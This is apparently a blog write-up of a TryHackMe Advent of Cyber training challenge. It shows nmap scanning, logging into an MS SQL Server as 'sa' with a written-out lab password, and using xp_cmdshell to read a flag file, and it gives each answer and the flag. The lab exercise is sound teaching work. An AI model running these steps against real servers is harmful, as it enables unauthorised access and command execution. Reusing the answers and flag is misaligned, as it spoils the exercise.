---
title:  "TryHackMe: Advent of Cyber - Day 11 - Where Are The Reindeers?"
date:   2021-12-18 12:30:00 +1000
excerpt: Learning about nmap.
---

This is a write up for the Day 11 - Where Are The Reindeers? challenge in the [**Advent of Cyber**](https://tryhackme.com/room/adventofcyber3) room on [TryHackMe](https://tryhackme.com). Some tasks may have been omitted as they do not require an answer.

***

### There is an open port related to MS SQL Server accessible over the network. What is the port number?

Run `nmap -sV 10.10.160.62 -v -Pn`.

<img src="{{ site.baseurl }}/assets/images/2021-12-18-advent-of-cyber-day-11/d11_01.jpg">

> Answer: **1433**

### If the connection is successful, you will get a prompt. What is the prompt that you have received?

Run `sqsh -S 10.10.160.62 -U sa -p t7uLKzddQzVjVFJp`

<img src="{{ site.baseurl }}/assets/images/2021-12-18-advent-of-cyber-day-11/d11_02.jpg">

> Answer: **1>**

### We can see four columns in the table displayed above: id, first (name), last (name), and nickname. What is the first name of the reindeer of id 9?

<img src="{{ site.baseurl }}/assets/images/2021-12-18-advent-of-cyber-day-11/d11_03.jpg">

> Answer: **Rudolph**

### Check the table schedule. What is the destination of the trip scheduled on December 7?

Run `SELECT * FROM reindeer.dbo.schedule`

<img src="{{ site.baseurl }}/assets/images/2021-12-18-advent-of-cyber-day-11/d11_04.jpg">

> Answer: **Prague**

### Check the table presents. What is the quantity available for the present “Power Bank”?

Run `SELECT * FROM reindeer.dbo.presents`

<img src="{{ site.baseurl }}/assets/images/2021-12-18-advent-of-cyber-day-11/d11_05.jpg">

> Answer: **25000**

### There is a flag hidden in the grinch user's home directory. What are its contents?

Run `xp_cmdshell 'dir c:\users\grinch\Documents`

This shows a file called `flag.txt`.

<img src="{{ site.baseurl }}/assets/images/2021-12-18-advent-of-cyber-day-11/d11_06.jpg">

Run `xp_cmdshell 'type c:\users\grinch\Documents\flag.txt`

<img src="{{ site.baseurl }}/assets/images/2021-12-18-advent-of-cyber-day-11/d11_07.jpg">

> Answer: **THM{YjtKeUy2qT3v5dDH}**

### Recap

In this task we learnt:
 * How to conduct port scans
 * Using sqsh to interact with a MS SQL Server
 * Executing commands with xp_cmdshell to read outputs using sqsh
 